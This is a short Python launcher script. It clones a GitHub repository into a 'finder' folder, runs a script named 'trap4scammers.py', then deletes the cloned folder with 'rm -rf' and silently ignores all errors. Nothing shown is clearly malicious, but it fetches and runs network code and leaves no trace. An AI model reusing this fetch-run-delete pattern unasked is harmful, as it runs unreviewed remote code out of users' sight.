from os import system, getcwd

if __name__ == "__main__":

    try:
        system("git clone https://github.com/syroiezhin/console2app finder")
        system("python3 trap4scammers.py")
        system(f"rm -rf {getcwd()}/finder")
    except: pass